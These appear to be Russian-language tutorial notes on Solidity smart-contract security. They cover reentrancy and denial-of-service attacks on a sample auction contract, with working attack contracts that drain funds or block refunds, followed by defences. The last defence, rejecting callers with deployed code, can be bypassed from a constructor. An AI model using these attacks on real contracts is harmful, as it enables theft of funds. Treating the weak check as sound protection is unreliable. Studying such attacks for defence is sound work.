### Reentrancy Attack

Допустим есть аукцион:

```solidity
contract ReentrancyAuction {
    mapping (address => uint) public bidders;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

    function refund() external {
        uint _amount = bidders[msg.sender];
        if (_amount > 0) {
            (bool success, ) = msg.sender.call{value: _amount}("");
            require(success, "failed");

            bidders[msg.sender] = 0;
        }
    }

    function contractBalance() external view returns(uint) {
        return address(this).balance;
    }
}
```

Создаем свой контракт, через который будет выкачивать деньги:
```solidity
contract ReentrancyAttack {
    ReentrancyAuction auction;

    constructor(address _auction) {
        auction = ReentrancyAuction(_auction);
    }

    // проброс денег, то есть делаем извне транзакцию
    function proxyBid() external payable {
        auction.bid{value: msg.value}();
    }

    // сначала запускается функция attack(), после чего в ReentrancyAuction происходит call.
    // Пока call не завершен, мы попадаем в функцию receive (так как она payable), откуда
    // происходит еще один вызов. Все это будет происходить до того, пока весь баланс контракта
    // ReentrancyAuction не выкачается.
    function attack() external {
        auction.refund();
    }

    receive() external payable {
        auction.refund();
    }

    function currentBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

#### Как защититься?

1. Перед вызовом call в ReentrancyAuction нужно делать bidders[msg.sender] = 0;
2. Использовать noReentrancy(видимо абстрактный контракт) из OpenZeppelin либо написать самому:

```solidity
contract ReentrancyAuction {
    bool locked;

    modifier noReentrancy() {
        require(!locked, "no reentrancy");
        locked = true;
        _; // здесь выполняется код функции
        locked = false;
    }

    function refund() external noReentrancy {
        // code
    }

}
```

Блокировки других юзеров не произойдет, потому как транзакции выполняются одна за другой.


### DoS (Denial of Service)

```solidity
contract DosAuction {
    mapping (address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }

    // сам контракт возвращаем средства на кошельки
    function refund() external {
        for (uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success, ) = bidder.call{value: bidders[bidder]}("");
            require(success, "failed");
            refundProgress++;

        }
    }

    function contractBalance() external view returns(uint) {
        return address(this).balance;
    }
}
```


```solidity
contract DosAttack {
    DosAuction auction;
    bool hack = true;
    address payable owner;

    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    // проброс денег, то есть делаем извне транзакцию
    function proxyBid() external payable {
        auction.bid{value: msg.value}();
    }

    function setHack() external {
        require(msg.sender == owner, "only owner");
        hack = !hack;
    }

    receive() external payable {
        if (hack) {
            assert(false);
            // while(true) {}
        } else {
            owner.transfer(msg.value);
        }
    }

    function currentBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

Таким образом, хакер может сделать выплаты рефандов невозможными, так как его функция receive никогда не завершится успехом.

Как можно защититься?
1. Сделать функцию refund, чтобы каждый аккаунт сам делал refund (как в предыдущем случае).
2. Не делать require:

```solidity 
    address[] failedRefund;

    function refund() external {
        for (uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success, ) = bidder.call{value: bidders[bidder]}("");
            if (!success) { 
                failedRefund.push(bidder);
            }

            refundProgress++;
        }
    }
```
3. Запретить ставки со смарт контрактов:

```solidity
        function bid() external payable {
            require(msg.sender.code.length == 0, "no smart contracts");
        }
```
